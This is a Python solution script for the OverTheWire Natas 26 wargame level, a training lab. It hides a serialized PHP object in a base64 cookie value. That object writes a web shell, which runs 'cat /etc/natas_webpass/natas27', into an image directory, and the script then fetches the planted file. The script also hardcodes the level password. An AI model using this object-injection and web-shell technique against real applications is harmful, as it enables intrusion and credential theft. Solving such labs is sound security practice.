import requests
from string import *
import base64


username = "natas26"
password = "cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE"
url = f"http://{username}.natas.labs.overthewire.org/"
url2 = f"http://{username}.natas.labs.overthewire.org/img/winner.php"
pw = ""

session = requests.Session()
response = session.get(url, auth=(username, password))
print(response.text)
print("Status code:", response.status_code)
drawing = "Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNDoiaW1nL3dpbm5lci5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czo1MToiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4KIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NTE6Ijw/cGhwIHN5c3RlbSgnY2F0IC9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7ID8+CiI7fQ=="
response = session.post(url, auth=(username, password), cookies={"drawing": drawing})
print(response.text)
print("Status code:", response.status_code)
response = session.get(url2, auth=(username, password))
print(response.text)
#response = session.get(url2, auth=(username, password))
#print("Status code:", response.status_code)
#print(response.text)
